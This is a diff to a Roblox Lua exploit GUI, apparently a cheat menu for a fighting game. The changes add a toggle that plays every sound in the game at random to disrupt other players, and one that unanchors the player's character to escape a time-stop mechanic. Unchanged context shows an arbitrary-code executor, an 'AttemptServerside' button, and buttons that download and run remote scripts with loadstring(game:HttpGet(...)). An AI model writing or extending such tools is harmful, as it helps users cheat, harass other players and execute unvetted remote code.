@@ -49,16 +49,20 @@ local ESplash_2 = Instance.new("TextLabel")
 local ESplashButton_2 = Instance.new("ImageButton")
 local TextLabel_5 = Instance.new("TextLabel")
 local Tab4_2 = Instance.new("Frame")
-local ESplash_3 = Instance.new("TextLabel")
-local ESplashButton_3 = Instance.new("ImageButton")
+local VTWKnife = Instance.new("TextLabel")
+local VTWKnifeButton = Instance.new("ImageButton")
 local TextLabel_6 = Instance.new("TextLabel")
 local Tab3_2 = Instance.new("Frame")
+local ESplash_3 = Instance.new("TextLabel")
+local ESplashButton_3 = Instance.new("ImageButton")
+local TextLabel_7 = Instance.new("TextLabel")
+local SpamSounds = Instance.new("TextLabel")
+local SpamSoundsButton = Instance.new("ImageButton")
+local TSMovement = Instance.new("TextLabel")
+local SpamSoundsButton_2 = Instance.new("ImageButton")
+local Tab5_2 = Instance.new("Frame")
 local ESplash_4 = Instance.new("TextLabel")
 local ESplashButton_4 = Instance.new("ImageButton")
-local TextLabel_7 = Instance.new("TextLabel")
-local Tab5_2 = Instance.new("Frame")
-local ESplash_5 = Instance.new("TextLabel")
-local ESplashButton_5 = Instance.new("ImageButton")
 local TextLabel_8 = Instance.new("TextLabel")
 local Settings = Instance.new("Frame")
 local ScrollingFrame = Instance.new("ScrollingFrame")
@@ -378,6 +382,7 @@ Home.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Home.BorderSizePixel = 0
 Home.Position = UDim2.new(0.187984496, 0, 0, 0)
 Home.Size = UDim2.new(0, 419, 0, 224)
+Home.Visible = false
 
 Welcome.Name = "Welcome"
 Welcome.Parent = Home
@@ -626,8 +631,54 @@ Tab4_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
 Tab4_2.Size = UDim2.new(0, 412, 0, 224)
 Tab4_2.Visible = false
 
+VTWKnife.Name = "VTWKnife"
+VTWKnife.Parent = Tab4_2
+VTWKnife.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+VTWKnife.BackgroundTransparency = 1.000
+VTWKnife.BorderColor3 = Color3.fromRGB(0, 0, 0)
+VTWKnife.BorderSizePixel = 0
+VTWKnife.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
+VTWKnife.Size = UDim2.new(0, 200, 0, 50)
+VTWKnife.Font = Enum.Font.ArialBold
+VTWKnife.Text = "VTW Knife (1, K)"
+VTWKnife.TextColor3 = Color3.fromRGB(0, 0, 0)
+VTWKnife.TextScaled = true
+VTWKnife.TextSize = 14.000
+VTWKnife.TextWrapped = true
+
+VTWKnifeButton.Name = "VTWKnifeButton"
+VTWKnifeButton.Parent = VTWKnife
+VTWKnifeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+VTWKnifeButton.BackgroundTransparency = 1.000
+VTWKnifeButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+VTWKnifeButton.BorderSizePixel = 0
+VTWKnifeButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
+VTWKnifeButton.Size = UDim2.new(0, 20, 0, 32)
+VTWKnifeButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
+
+TextLabel_6.Parent = Tab4_2
+TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_6.BorderSizePixel = 5
+TextLabel_6.Size = UDim2.new(0, 412, 0, 22)
+TextLabel_6.Font = Enum.Font.Unknown
+TextLabel_6.Text = "TAB 4"
+TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_6.TextScaled = true
+TextLabel_6.TextSize = 14.000
+TextLabel_6.TextWrapped = true
+
+Tab3_2.Name = "Tab3"
+Tab3_2.Parent = Tabs
+Tab3_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Tab3_2.BackgroundTransparency = 0.500
+Tab3_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Tab3_2.BorderSizePixel = 5
+Tab3_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
+Tab3_2.Size = UDim2.new(0, 412, 0, 224)
+
 ESplash_3.Name = "ESplash"
-ESplash_3.Parent = Tab4_2
+ESplash_3.Parent = Tab3_2
 ESplash_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 ESplash_3.BackgroundTransparency = 1.000
 ESplash_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -635,7 +686,7 @@ ESplash_3.BorderSizePixel = 0
 ESplash_3.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
 ESplash_3.Size = UDim2.new(0, 200, 0, 50)
 ESplash_3.Font = Enum.Font.ArialBold
-ESplash_3.Text = "Emerald Splash"
+ESplash_3.Text = "Emerald Splash (LeftCtrl, K)"
 ESplash_3.TextColor3 = Color3.fromRGB(0, 0, 0)
 ESplash_3.TextScaled = true
 ESplash_3.TextSize = 14.000
@@ -651,30 +702,80 @@ ESplashButton_3.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
 ESplashButton_3.Size = UDim2.new(0, 20, 0, 32)
 ESplashButton_3.Image = "http://www.roblox.com/asset/?id=107075188558816"
 
-TextLabel_6.Parent = Tab4_2
-TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_6.BorderSizePixel = 5
-TextLabel_6.Size = UDim2.new(0, 412, 0, 22)
-TextLabel_6.Font = Enum.Font.Unknown
-TextLabel_6.Text = "TAB 1"
-TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_6.TextScaled = true
-TextLabel_6.TextSize = 14.000
-TextLabel_6.TextWrapped = true
+TextLabel_7.Parent = Tab3_2
+TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_7.BorderSizePixel = 5
+TextLabel_7.Size = UDim2.new(0, 412, 0, 22)
+TextLabel_7.Font = Enum.Font.Unknown
+TextLabel_7.Text = "TAB 3"
+TextLabel_7.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_7.TextScaled = true
+TextLabel_7.TextSize = 14.000
+TextLabel_7.TextWrapped = true
 
-Tab3_2.Name = "Tab3"
-Tab3_2.Parent = Tabs
-Tab3_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Tab3_2.BackgroundTransparency = 0.500
-Tab3_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Tab3_2.BorderSizePixel = 5
-Tab3_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
-Tab3_2.Size = UDim2.new(0, 412, 0, 224)
-Tab3_2.Visible = false
+SpamSounds.Name = "SpamSounds"
+SpamSounds.Parent = Tab3_2
+SpamSounds.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SpamSounds.BackgroundTransparency = 1.000
+SpamSounds.BorderColor3 = Color3.fromRGB(0, 0, 0)
+SpamSounds.BorderSizePixel = 0
+SpamSounds.Position = UDim2.new(0.0825242698, 0, 0.40625, 0)
+SpamSounds.Size = UDim2.new(0, 200, 0, 50)
+SpamSounds.Font = Enum.Font.ArialBold
+SpamSounds.Text = "Spam Sounds"
+SpamSounds.TextColor3 = Color3.fromRGB(0, 0, 0)
+SpamSounds.TextScaled = true
+SpamSounds.TextSize = 14.000
+SpamSounds.TextWrapped = true
+
+SpamSoundsButton.Name = "SpamSoundsButton"
+SpamSoundsButton.Parent = SpamSounds
+SpamSoundsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SpamSoundsButton.BackgroundTransparency = 1.000
+SpamSoundsButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+SpamSoundsButton.BorderSizePixel = 0
+SpamSoundsButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
+SpamSoundsButton.Size = UDim2.new(0, 20, 0, 32)
+SpamSoundsButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
+
+TSMovement.Name = "TSMovement"
+TSMovement.Parent = Tab3_2
+TSMovement.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TSMovement.BackgroundTransparency = 1.000
+TSMovement.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TSMovement.BorderSizePixel = 0
+TSMovement.Position = UDim2.new(0.0825242698, 0, 0.705357134, 0)
+TSMovement.Size = UDim2.new(0, 200, 0, 50)
+TSMovement.Font = Enum.Font.ArialBold
+TSMovement.Text = "TS Movement"
+TSMovement.TextColor3 = Color3.fromRGB(0, 0, 0)
+TSMovement.TextScaled = true
+TSMovement.TextSize = 14.000
+TSMovement.TextWrapped = true
+
+SpamSoundsButton_2.Name = "SpamSoundsButton"
+SpamSoundsButton_2.Parent = TSMovement
+SpamSoundsButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SpamSoundsButton_2.BackgroundTransparency = 1.000
+SpamSoundsButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+SpamSoundsButton_2.BorderSizePixel = 0
+SpamSoundsButton_2.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
+SpamSoundsButton_2.Size = UDim2.new(0, 20, 0, 32)
+SpamSoundsButton_2.Image = "http://www.roblox.com/asset/?id=107075188558816"
+
+Tab5_2.Name = "Tab5"
+Tab5_2.Parent = Tabs
+Tab5_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Tab5_2.BackgroundTransparency = 0.500
+Tab5_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Tab5_2.BorderSizePixel = 5
+Tab5_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
+Tab5_2.Size = UDim2.new(0, 412, 0, 224)
+Tab5_2.Visible = false
 
 ESplash_4.Name = "ESplash"
-ESplash_4.Parent = Tab3_2
+ESplash_4.Parent = Tab5_2
 ESplash_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 ESplash_4.BackgroundTransparency = 1.000
 ESplash_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -682,7 +783,7 @@ ESplash_4.BorderSizePixel = 0
 ESplash_4.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
 ESplash_4.Size = UDim2.new(0, 200, 0, 50)
 ESplash_4.Font = Enum.Font.ArialBold
-ESplash_4.Text = "Emerald Splash (LeftCtrl, K)"
+ESplash_4.Text = "Emerald Splash"
 ESplash_4.TextColor3 = Color3.fromRGB(0, 0, 0)
 ESplash_4.TextScaled = true
 ESplash_4.TextSize = 14.000
@@ -697,53 +798,6 @@ ESplashButton_4.BorderSizePixel = 0
 ESplashButton_4.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
 ESplashButton_4.Size = UDim2.new(0, 20, 0, 32)
 ESplashButton_4.Image = "http://www.roblox.com/asset/?id=107075188558816"
-
-TextLabel_7.Parent = Tab3_2
-TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_7.BorderSizePixel = 5
-TextLabel_7.Size = UDim2.new(0, 412, 0, 22)
-TextLabel_7.Font = Enum.Font.Unknown
-TextLabel_7.Text = "TAB 3"
-TextLabel_7.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_7.TextScaled = true
-TextLabel_7.TextSize = 14.000
-TextLabel_7.TextWrapped = true
-
-Tab5_2.Name = "Tab5"
-Tab5_2.Parent = Tabs
-Tab5_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Tab5_2.BackgroundTransparency = 0.500
-Tab5_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Tab5_2.BorderSizePixel = 5
-Tab5_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
-Tab5_2.Size = UDim2.new(0, 412, 0, 224)
-Tab5_2.Visible = false
-
-ESplash_5.Name = "ESplash"
-ESplash_5.Parent = Tab5_2
-ESplash_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ESplash_5.BackgroundTransparency = 1.000
-ESplash_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ESplash_5.BorderSizePixel = 0
-ESplash_5.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
-ESplash_5.Size = UDim2.new(0, 200, 0, 50)
-ESplash_5.Font = Enum.Font.ArialBold
-ESplash_5.Text = "Emerald Splash"
-ESplash_5.TextColor3 = Color3.fromRGB(0, 0, 0)
-ESplash_5.TextScaled = true
-ESplash_5.TextSize = 14.000
-ESplash_5.TextWrapped = true
-
-ESplashButton_5.Name = "ESplashButton"
-ESplashButton_5.Parent = ESplash_5
-ESplashButton_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ESplashButton_5.BackgroundTransparency = 1.000
-ESplashButton_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ESplashButton_5.BorderSizePixel = 0
-ESplashButton_5.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
-ESplashButton_5.Size = UDim2.new(0, 20, 0, 32)
-ESplashButton_5.Image = "http://www.roblox.com/asset/?id=107075188558816"
 
 TextLabel_8.Parent = Tab5_2
 TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -1067,7 +1121,7 @@ FullView.TextWrapped = true
 
 -- Scripts:
 wait(1.5)
-local function DXXGPAQ_fake_script() -- Frame.DragGUI 
+local function MDDB_fake_script() -- Frame.DragGUI 
 	local script = Instance.new('LocalScript', Frame)
 
 	--// Services
@@ -1124,8 +1178,8 @@ local function DXXGPAQ_fake_script() -- Frame.DragGUI
 		end
 	end)
 end
-coroutine.wrap(DXXGPAQ_fake_script)()
-local function SNBHTV_fake_script() -- Tab1.Tab1 
+coroutine.wrap(MDDB_fake_script)()
+local function ZQTVT_fake_script() -- Tab1.Tab1 
 	local script = Instance.new('LocalScript', Tab1)
 
 	script.Parent.Activated:Connect(function()
@@ -1142,8 +1196,8 @@ local function SNBHTV_fake_script() -- Tab1.Tab1
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(SNBHTV_fake_script)()
-local function XOJMGX_fake_script() -- Tab2.Tab2 
+coroutine.wrap(ZQTVT_fake_script)()
+local function GAYDJ_fake_script() -- Tab2.Tab2 
 	local script = Instance.new('LocalScript', Tab2)
 
 	script.Parent.Activated:Connect(function()
@@ -1160,8 +1214,8 @@ local function XOJMGX_fake_script() -- Tab2.Tab2
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(XOJMGX_fake_script)()
-local function IIUUR_fake_script() -- Tab4.Tab4 
+coroutine.wrap(GAYDJ_fake_script)()
+local function QPUU_fake_script() -- Tab4.Tab4 
 	local script = Instance.new('LocalScript', Tab4)
 
 	script.Parent.Activated:Connect(function()
@@ -1178,8 +1232,8 @@ local function IIUUR_fake_script() -- Tab4.Tab4
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(IIUUR_fake_script)()
-local function ADRQATY_fake_script() -- Tab3.Tab3 
+coroutine.wrap(QPUU_fake_script)()
+local function DVGBUGE_fake_script() -- Tab3.Tab3 
 	local script = Instance.new('LocalScript', Tab3)
 
 	script.Parent.Activated:Connect(function()
@@ -1196,8 +1250,8 @@ local function ADRQATY_fake_script() -- Tab3.Tab3
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(ADRQATY_fake_script)()
-local function RSFYPQQ_fake_script() -- Tab6.Tab6 
+coroutine.wrap(DVGBUGE_fake_script)()
+local function NVGJ_fake_script() -- Tab6.Tab6 
 	local script = Instance.new('LocalScript', Tab6)
 
 	script.Parent.Activated:Connect(function()
@@ -1214,8 +1268,8 @@ local function RSFYPQQ_fake_script() -- Tab6.Tab6
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(RSFYPQQ_fake_script)()
-local function FJLVTN_fake_script() -- Tab5.Tab5 
+coroutine.wrap(NVGJ_fake_script)()
+local function HUHIEIB_fake_script() -- Tab5.Tab5 
 	local script = Instance.new('LocalScript', Tab5)
 
 	script.Parent.Activated:Connect(function()
@@ -1232,8 +1286,8 @@ local function FJLVTN_fake_script() -- Tab5.Tab5
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(FJLVTN_fake_script)()
-local function EHUYPD_fake_script() -- Executor.Executor 
+coroutine.wrap(HUHIEIB_fake_script)()
+local function MSAGUQR_fake_script() -- Executor.Executor 
 	local script = Instance.new('LocalScript', Executor)
 
 	script.Parent.Activated:Connect(function()
@@ -1249,8 +1303,8 @@ local function EHUYPD_fake_script() -- Executor.Executor
 		tabs.Executor.Visible = true
 	end)
 end
-coroutine.wrap(EHUYPD_fake_script)()
-local function ELXHRU_fake_script() -- Tab7.Tab7 
+coroutine.wrap(MSAGUQR_fake_script)()
+local function VAWUXK_fake_script() -- Tab7.Tab7 
 	local script = Instance.new('LocalScript', Tab7)
 
 	script.Parent.Activated:Connect(function()
@@ -1267,8 +1321,8 @@ local function ELXHRU_fake_script() -- Tab7.Tab7
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(ELXHRU_fake_script)()
-local function KZCK_fake_script() -- _15SecondTSButton.ButtonManager 
+coroutine.wrap(VAWUXK_fake_script)()
+local function EFIO_fake_script() -- _15SecondTSButton.ButtonManager 
 	local script = Instance.new('LocalScript', _15SecondTSButton)
 
 	local on = false
@@ -1302,8 +1356,8 @@ local function KZCK_fake_script() -- _15SecondTSButton.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(KZCK_fake_script)()
-local function QJNA_fake_script() -- AntiTSButton.ButtonManager 
+coroutine.wrap(EFIO_fake_script)()
+local function UKUOMP_fake_script() -- AntiTSButton.ButtonManager 
 	local script = Instance.new('LocalScript', AntiTSButton)
 
 	local on = false
@@ -1415,8 +1469,8 @@ local function QJNA_fake_script() -- AntiTSButton.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(QJNA_fake_script)()
-local function EDYACUS_fake_script() -- BlockGlitch_2.ButtonManager 
+coroutine.wrap(UKUOMP_fake_script)()
+local function PCMXGEQ_fake_script() -- BlockGlitch_2.ButtonManager 
 	local script = Instance.new('LocalScript', BlockGlitch_2)
 
 	local on = false
@@ -1455,31 +1509,31 @@ local function EDYACUS_fake_script() -- BlockGlitch_2.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(EDYACUS_fake_script)()
-local function IGPA_fake_script() -- Execute.LocalScript 
+coroutine.wrap(PCMXGEQ_fake_script)()
+local function FWOFGU_fake_script() -- Execute.LocalScript 
 	local script = Instance.new('LocalScript', Execute)
 
 	script.Parent.Activated:Connect(function()
 		loadstring(script.Parent.Parent.TextBox.Text)
 	end)
 end
-coroutine.wrap(IGPA_fake_script)()
-local function VBBS_fake_script() -- Clear.LocalScript 
+coroutine.wrap(FWOFGU_fake_script)()
+local function GWBW_fake_script() -- Clear.LocalScript 
 	local script = Instance.new('LocalScript', Clear)
 
 	script.Parent.Activated:Connect(function()
 		script.Parent.Parent.TextBox.Text = "--WRITE YOUR SCRIPT"
 	end)
 end
-coroutine.wrap(VBBS_fake_script)()
-local function OQTD_fake_script() -- Welcome.LocalScript 
+coroutine.wrap(GWBW_fake_script)()
+local function WMWOQ_fake_script() -- Welcome.LocalScript 
 	local script = Instance.new('LocalScript', Welcome)
 
 	local lp = game.Players.LocalPlayer
 	script.Parent.Text = "Welcome, "..lp.Name.."!"
 end
-coroutine.wrap(OQTD_fake_script)()
-local function SZNYR_fake_script() -- Quote.LocalScript 
+coroutine.wrap(WMWOQ_fake_script)()
+local function NBLC_fake_script() -- Quote.LocalScript 
 	local script = Instance.new('LocalScript', Quote)
 
 	local numbers = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
@@ -1508,8 +1562,8 @@ local function SZNYR_fake_script() -- Quote.LocalScript
 		script.Parent.Text = "Ready to kill?"
 	end
 end
-coroutine.wrap(SZNYR_fake_script)()
-local function YLJD_fake_script() -- TextBox_2.EnsureConstantInvite 
+coroutine.wrap(NBLC_fake_script)()
+local function ARKKGG_fake_script() -- TextBox_2.EnsureConstantInvite 
 	local script = Instance.new('LocalScript', TextBox_2)
 
 	while wait(0.1) do
@@ -1518,8 +1572,8 @@ local function YLJD_fake_script() -- TextBox_2.EnsureConstantInvite
 		end
 	end
 end
-coroutine.wrap(YLJD_fake_script)()
-local function XETFIH_fake_script() -- STWRTZButton.ButtonManager 
+coroutine.wrap(ARKKGG_fake_script)()
+local function PFRKRXV_fake_script() -- STWRTZButton.ButtonManager 
 	local script = Instance.new('LocalScript', STWRTZButton)
 
 	local on = false
@@ -1581,8 +1635,8 @@ local function XETFIH_fake_script() -- STWRTZButton.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(XETFIH_fake_script)()
-local function RRAM_fake_script() -- STWRTZButton_2.ButtonManager 
+coroutine.wrap(PFRKRXV_fake_script)()
+local function PUFRFC_fake_script() -- STWRTZButton_2.ButtonManager 
 	local script = Instance.new('LocalScript', STWRTZButton_2)
 
 	local on = false
@@ -1635,8 +1689,8 @@ local function RRAM_fake_script() -- STWRTZButton_2.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(RRAM_fake_script)()
-local function IOHLY_fake_script() -- D4CClonesButton.ButtonManager 
+coroutine.wrap(PUFRFC_fake_script)()
+local function DTEJHM_fake_script() -- D4CClonesButton.ButtonManager 
 	local script = Instance.new('LocalScript', D4CClonesButton)
 
 	local on = false
@@ -1727,8 +1781,8 @@ local function IOHLY_fake_script() -- D4CClonesButton.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(IOHLY_fake_script)()
-local function CNLERTT_fake_script() -- ESplashButton.ButtonManager 
+coroutine.wrap(DTEJHM_fake_script)()
+local function LCVAE_fake_script() -- ESplashButton.ButtonManager 
 	local script = Instance.new('LocalScript', ESplashButton)
 
 	local on = false
@@ -1749,8 +1803,8 @@ local function CNLERTT_fake_script() -- ESplashButton.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(CNLERTT_fake_script)()
-local function KAPGOSC_fake_script() -- ESplashButton_2.ButtonManager 
+coroutine.wrap(LCVAE_fake_script)()
+local function MTTWZB_fake_script() -- ESplashButton_2.ButtonManager 
 	local script = Instance.new('LocalScript', ESplashButton_2)
 
 	local on = false
@@ -1771,9 +1825,9 @@ local function KAPGOSC_fake_script() -- ESplashButton_2.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(KAPGOSC_fake_script)()
-local function JXYRZG_fake_script() -- ESplashButton_3.ButtonManager 
-	local script = Instance.new('LocalScript', ESplashButton_3)
+coroutine.wrap(MTTWZB_fake_script)()
+local function OUORUY_fake_script() -- VTWKnifeButton.ButtonManager 
+	local script = Instance.new('LocalScript', VTWKnifeButton)
 
 	local on = false
 	local off = true
@@ -1793,9 +1847,9 @@ local function JXYRZG_fake_script() -- ESplashButton_3.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(JXYRZG_fake_script)()
-local function QHPA_fake_script() -- ESplashButton_4.ButtonManager 
-	local script = Instance.new('LocalScript', ESplashButton_4)
+coroutine.wrap(OUORUY_fake_script)()
+local function LUSIJ_fake_script() -- ESplashButton_3.ButtonManager 
+	local script = Instance.new('LocalScript', ESplashButton_3)
 
 	local ESB = script.Parent
 	local on = false
@@ -1840,9 +1894,109 @@ local function QHPA_fake_script() -- ESplashButton_4.ButtonManager
 	end)
 	
 end
-coroutine.wrap(QHPA_fake_script)()
-local function AJJZ_fake_script() -- ESplashButton_5.ButtonManager 
-	local script = Instance.new('LocalScript', ESplashButton_5)
+coroutine.wrap(LUSIJ_fake_script)()
+local function GIJSW_fake_script() -- SpamSoundsButton.ButtonManager 
+	local script = Instance.new('LocalScript', SpamSoundsButton)
+
+	local ESB = script.Parent
+	local on = false
+	local off = true
+	local UIS = game:GetService("UserInputService")
+	
+	ESB.Activated:Connect(function()
+		if off == true then
+			on = true
+			off = false
+			print("SPAM NOISES ON")
+			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
+			while on == true do
+				wait(30)
+				local sounds = {}
+				local function getSounds(loc)
+					if loc:IsA("Sound") then
+						table.insert(sounds, loc)
+					end
+					for _, obj in pairs(loc:GetChildren()) do
+						getSounds(obj)
+					end
+				end
+				getSounds(game)
+				game.DescendantAdded:Connect(function(obj)
+					if obj:IsA("Sound") then
+						table.insert(sounds, obj)
+					end
+				end)
+				while wait(0.1) do
+					if #sounds > 0 then
+						local randomIndex = math.random(1, #sounds)
+						local randomSound = sounds[randomIndex]
+	
+						pcall(function()
+							randomSound:Play()
+						end)
+					end
+				end
+			end
+		elseif on == true then
+			on = false
+			off = true
+			print("SPAM NOISES OFF")
+			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
+		end
+	end)
+	
+end
+coroutine.wrap(GIJSW_fake_script)()
+local function DQZPQ_fake_script() -- SpamSoundsButton_2.ButtonManager 
+	local script = Instance.new('LocalScript', SpamSoundsButton_2)
+
+	local ESB = script.Parent
+	local on = false
+	local off = true
+	local UIS = game:GetService("UserInputService")
+	
+	ESB.Activated:Connect(function()
+		if off == true then
+			on = true
+			off = false
+			print("TS MOVEMENT ON")
+			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"		
+			local player = game.Players.LocalPlayer
+			local function unanchorParts(character)
+				if character then
+					for _, part in pairs(character:GetDescendants()) do
+						if part:IsA("BasePart") then
+							if part.Anchored == true then
+								part.Anchored = false
+							end
+						end
+					end
+				end
+			end
+			while on == true do
+				local character = player.Character
+				if character then
+					local stand = character:FindFirstChild("Stand")
+					if stand then
+						unanchorParts(character)
+						unanchorParts(stand)
+					end
+				end
+	
+				task.wait(0.1)
+			end
+		elseif on == true then
+			on = false
+			off = true
+			print("TS MOVEMENT OFF")
+			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
+		end
+	end)
+	
+end
+coroutine.wrap(DQZPQ_fake_script)()
+local function KZIV_fake_script() -- ESplashButton_4.ButtonManager 
+	local script = Instance.new('LocalScript', ESplashButton_4)
 
 	local on = false
 	local off = true
@@ -1862,8 +2016,8 @@ local function AJJZ_fake_script() -- ESplashButton_5.ButtonManager
 		end
 	end)
 end
-coroutine.wrap(AJJZ_fake_script)()
-local function UTOECJL_fake_script() -- ReduceLag.ReduceLag 
+coroutine.wrap(KZIV_fake_script)()
+local function AISL_fake_script() -- ReduceLag.ReduceLag 
 	local script = Instance.new('LocalScript', ReduceLag)
 
 	script.Parent.Activated:Connect(function()
@@ -1890,8 +2044,8 @@ local function UTOECJL_fake_script() -- ReduceLag.ReduceLag
 	end)
 	
 end
-coroutine.wrap(UTOECJL_fake_script)()
-local function PXOFU_fake_script() -- DeleteFire.DeleteFire 
+coroutine.wrap(AISL_fake_script)()
+local function WHOE_fake_script() -- DeleteFire.DeleteFire 
 	local script = Instance.new('LocalScript', DeleteFire)
 
 	script.Parent.Activated:Connect(function()
@@ -1900,8 +2054,8 @@ local function PXOFU_fake_script() -- DeleteFire.DeleteFire
 	end)
 	
 end
-coroutine.wrap(PXOFU_fake_script)()
-local function KDQXMIX_fake_script() -- AttemptServerside.AttemptServerside 
+coroutine.wrap(WHOE_fake_script)()
+local function DRJXJWT_fake_script() -- AttemptServerside.AttemptServerside 
 	local script = Instance.new('LocalScript', AttemptServerside)
 
 	script.Parent.Activated:Connect(function()
@@ -1910,8 +2064,8 @@ local function KDQXMIX_fake_script() -- AttemptServerside.AttemptServerside
 		end
 	end)
 end
-coroutine.wrap(KDQXMIX_fake_script)()
-local function JZNC_fake_script() -- RespawnSameSpot.RespawnSameSpot 
+coroutine.wrap(DRJXJWT_fake_script)()
+local function ZJJGAAM_fake_script() -- RespawnSameSpot.RespawnSameSpot 
 	local script = Instance.new('LocalScript', RespawnSameSpot)
 
 	local vals = false
@@ -1975,8 +2129,8 @@ local function JZNC_fake_script() -- RespawnSameSpot.RespawnSameSpot
 		end
 	end)
 end
-coroutine.wrap(JZNC_fake_script)()
-local function CXEX_fake_script() -- Settings_2.Settings 
+coroutine.wrap(ZJJGAAM_fake_script)()
+local function TNYVG_fake_script() -- Settings_2.Settings 
 	local script = Instance.new('LocalScript', Settings_2)
 
 	script.Parent.Activated:Connect(function()
@@ -1993,16 +2147,16 @@ local function CXEX_fake_script() -- Settings_2.Settings
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(CXEX_fake_script)()
-local function NZUHSH_fake_script() -- Close.Exit 
+coroutine.wrap(TNYVG_fake_script)()
+local function STMTU_fake_script() -- Close.Exit 
 	local script = Instance.new('LocalScript', Close)
 
 	script.Parent.Activated:Connect(function()
 		script.Parent.Parent.Parent:Destroy()
 	end)
 end
-coroutine.wrap(NZUHSH_fake_script)()
-local function KLJDZX_fake_script() -- Minimize.Minimize 
+coroutine.wrap(STMTU_fake_script)()
+local function RNZCGWO_fake_script() -- Minimize.Minimize 
 	local script = Instance.new('LocalScript', Minimize)
 
 	script.Parent.Activated:Connect(function()
@@ -2010,48 +2164,48 @@ local function KLJDZX_fake_script() -- Minimize.Minimize
 		script.Parent.Parent.Parent.FullView.Visible = true
 	end)
 end
-coroutine.wrap(KLJDZX_fake_script)()
-local function AZUDW_fake_script() -- IY.IYLoadstring 
+coroutine.wrap(RNZCGWO_fake_script)()
+local function KLFTUAY_fake_script() -- IY.IYLoadstring 
 	local script = Instance.new('LocalScript', IY)
 
 	script.Parent.Activated:Connect(function()
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 	end)
 end
-coroutine.wrap(AZUDW_fake_script)()
-local function MHDRWO_fake_script() -- Dex.DexLoadstring 
+coroutine.wrap(KLFTUAY_fake_script)()
+local function ZHRUFNL_fake_script() -- Dex.DexLoadstring 
 	local script = Instance.new('LocalScript', Dex)
 
 	script.Parent.Activated:Connect(function()
